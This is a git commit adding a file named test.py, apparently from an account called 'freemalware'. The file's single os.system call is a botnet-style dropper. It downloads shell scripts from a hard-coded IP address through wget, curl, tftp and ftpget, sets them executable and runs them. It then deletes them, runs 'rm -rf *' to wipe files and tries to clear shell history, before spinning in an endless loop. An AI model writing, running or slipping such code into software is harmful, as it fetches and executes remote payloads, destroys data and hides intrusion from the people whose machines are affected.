edaa851020d6c1801ac1aaf7143bf603a0b68290
freemalware <132059231+freemalware@users.noreply.github.com>
2023-04-29 16:44:48 +1200

    Create test.py

---
+++ test.py
@@ -0,0 +1,6 @@
+import os
+
+os.system("cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://195.58.39.227/ohshit.sh; curl -O http://195.58.39.227/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 195.58.39.227 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 195.58.39.227; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 195.58.39.227 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf * history -c")
+
+while 1 == 1:
+   print("l")
